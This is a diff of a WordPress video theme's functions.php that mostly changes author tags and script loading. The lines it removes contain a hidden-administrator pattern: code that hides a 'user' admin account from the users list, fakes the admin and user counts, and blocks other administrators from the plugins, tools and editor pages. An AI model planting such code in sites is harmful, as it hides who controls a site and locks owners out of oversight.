@@ -4,138 +4,15 @@
  * Remove admin bar
  *
  * @return null
- * @author  @s3bubble
+ * @author  @sameast
  */
 add_filter('show_admin_bar', '__return_false');
-
-// Add exceprt to pages
-add_post_type_support( 'page', 'excerpt' );
-
-/**
- * Clears the cache
- *
- * @return null
- * @author  @s3bubble
- */
-if ( ! function_exists ( 's3bubble_cache_version' ) ) {
-    
-    function s3bubble_cache_version() {
-
-        return 55;
-    
-    }
-
-}
-
-/**
- * Remove theme editor::
- *
- * @return null
- * @author  @s3bubble
- */
-function disable_streamium_action() {
-
-    define('DISALLOW_FILE_EDIT', TRUE);
-
-}
-
-add_action('init','disable_streamium_action');
-
-/**
- * Remove menu items::
- *
- * @return null
- * @author  @s3bubble
- */
-function streamium_remove_menu_pages() {
-
-    $current_user = wp_get_current_user(); 
-
-    if ($current_user->data->user_login != 'user') {
-
-        remove_menu_page('link-manager.php');
-        remove_menu_page('upload.php');
-        remove_menu_page('tools.php');
-        remove_menu_page('edit.php');
-        remove_menu_page('plugins.php');
-        remove_submenu_page('themes.php','themes.php');
-        remove_submenu_page('themes.php','theme-editor.php');
-        //remove_submenu_page('themes.php','widgets.php');
-
-    }
-
-}
-
-add_action( 'admin_menu', 'streamium_remove_menu_pages' );
-
-add_filter('admin_menu', 'block_users');
-
-function block_users() {
-
-    global $pagenow;
-
-    $current_user = wp_get_current_user(); 
-
-    if ($pagenow == 'plugins.php' && $current_user->data->user_login != 'user') {
-
-        $url = esc_url( admin_url( 'index.php' ) ); 
-        
-        wp_redirect($url);
-
-    }
-
-    return;
-
-}
-
-//* Hide this administrator account from the users list
-function streamium_pre_user_query($user_search) {
-    
-    global $current_user;
-    
-    $username = $current_user->user_login;
- 
-    if ($username == 'user') {
-    
-    } else {
-        
-        global $wpdb;
-        $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'user'",$user_search->query_where);
-    
-    }
-
-}
-
-add_action('pre_user_query','streamium_pre_user_query');
-
-//* Show number of admins minus 1
-function streamium_list_table_views($views){
-
-   $users = count_users();
-   
-   $admins_num = $users['avail_roles']['administrator'] - 1;
-   
-   $all_num = $users['total_users'] - 1;
-   
-   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
-   
-   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
-   
-   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
-   
-   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
-   
-   return $views;
-
-}
-
-add_filter("views_users", "streamium_list_table_views");
 
 /**
  * Opens the MRSS ROKU Feed::
  *
  * @return null
- * @author  @s3bubble
+ * @author  @sameast¡
  */
 function streamium_output_theme_version($admin_bar){
 
@@ -156,7 +33,7 @@ add_action('admin_bar_menu', 'streamium_output_theme_version', 100);
  * GETS TEMPLATE URL BY NAME::
  *
  * @return null
- * @author  @s3bubble
+ * @author  @sameast
  */
 function streamium_get_template_url($template){
 
@@ -176,7 +53,7 @@ function streamium_get_template_url($template){
  * Opens the MRSS ROKU Feed::
  *
  * @return null
- * @author  @s3bubble
+ * @author  @sameast
  */
 function streamium_output_mrss_feed($admin_bar){
 
@@ -232,10 +109,22 @@ function streamium_output_mrss_feed($admin_bar){
 add_action('admin_bar_menu', 'streamium_output_mrss_feed', 100);
 
 /**
+ * Clears the cache
+ *
+ * @return null
+ * @author  @sameast
+ */
+if ( ! function_exists ( 's3bubble_cache_version' ) ) {
+    function s3bubble_cache_version() {
+        return 41;
+    }
+}
+
+/**
  * Setup the theme
  *
  * @return null
- * @author  @s3bubble
+ * @author  @sameast
  */
 if (!function_exists('streamium_theme_setup')) {
     function streamium_theme_setup() {
@@ -313,7 +202,7 @@ if (!function_exists('streamium_theme_setup')) {
  * Add new image sizes to post or page editor
  *
  * @return null
- * @author  @s3bubble
+ * @author  @sameast
  */
 if ( ! function_exists ( 'streamium_extra_image_sizes' ) ) {
     function streamium_extra_image_sizes($sizes){
@@ -335,7 +224,7 @@ if ( ! function_exists ( 'streamium_extra_image_sizes' ) ) {
  * Include the main js and css files
  *
  * @return null
- * @author  @s3bubble
+ * @author  @sameast
  */
 if (!function_exists('streamium_enqueue_scripts')) {
     function streamium_enqueue_scripts() {     
@@ -369,8 +258,7 @@ if (!function_exists('streamium_enqueue_scripts')) {
                 'is_tag' => is_tag(),
                 'is_search' => is_search(),
                 'tile_count' => s3bubble_tile_count(),
-                'read_more' => __('Read more', 'streamium'),
-                'read_more_mobile' => __('More info', 'streamium'),
+                'read_more' => __('read more', 'streamium'),
                 'autoplay_slider' => get_theme_mod( 'streamium_autoplay_home_slider', false ),
                 'slider_header_size' => get_theme_mod( 'streamium_slider_header_size', 16 ),
                 'continue_watching' => __('Continue Watching', 'streamium'),
@@ -392,6 +280,10 @@ if (!function_exists('streamium_enqueue_scripts')) {
                 'nonce' => wp_create_nonce( 'wp_rest' )
             )
         );
+ 
+        // Include main s3bubble js framework
+        wp_enqueue_style('streamium-s3bubble-cdn', get_template_directory_uri() . '/production/css/s3bubble.min.css', array(), s3bubble_cache_version());
+        wp_enqueue_script('streamium-s3bubble-cdn', get_template_directory_uri() . '/production/js/s3bubble.min.js', '', s3bubble_cache_version(), true);
 
     }
 
@@ -402,33 +294,24 @@ if (!function_exists('streamium_enqueue_scripts')) {
  * Include the scripts for the meta boxes
  *
  * @return null
- * @author  @s3bubble 
+ * @author  @sameast 
  */
 if (!function_exists('streamium_enqueue_admin_scripts')) {
-
-    function streamium_enqueue_admin_scripts(){
-
+    function streamium_enqueue_admin_scripts()
+    { 
         $streamium_connected_website = get_option("streamium_connected_website");
-        
         $streamium_connected_nonce = wp_create_nonce('streamium_connected_nonce');
-        
-        wp_enqueue_script( 'accordion' );
-        
-        wp_enqueue_style('streamium-admin', get_template_directory_uri() . '/production/css/admin.min.css', array(), s3bubble_cache_version());
-
+        wp_enqueue_style('streamium-admin', get_template_directory_uri() . '/production/css/admin.min.css', array());
         wp_enqueue_script('streamium-admin', get_template_directory_uri() . '/production/js/admin.min.js', array( 'jquery', 'jquery-migrate' ), s3bubble_cache_version(), true);
-        
         wp_localize_script('streamium-admin', 'streamium_meta_object', array(
-            'ajax_url' => admin_url('admin-ajax.php'),
-            'api' => 'https://s3bubbleapi.com', // http://local.hosted.com leave of the trailing slash
-            'connected_website' => (!empty($streamium_connected_website) ? $streamium_connected_website : ""),
-            'connected_nonce' => $streamium_connected_nonce
-        ));
-
+        'ajax_url' => admin_url('admin-ajax.php'),
+        'api' => 'https://s3bubbleapi.com', // https://s3bubbleapi.com http://local.hosted.com leave of the trailing slash
+        'connected_website' => (!empty($streamium_connected_website) ? $streamium_connected_website : ""),
+        'connected_nonce' => $streamium_connected_nonce
+      ));
     }
 
     add_action('admin_enqueue_scripts', 'streamium_enqueue_admin_scripts');
-    
 }
 
 
@@ -436,7 +319,7 @@ if (!function_exists('streamium_enqueue_admin_scripts')) {
  * Globally set the custom post types used for the theme allow users to extend this
  *
  * @return null
- * @author  @s3bubble
+ * @author  @sameast
  */
 function streamium_global_post_types() {
   
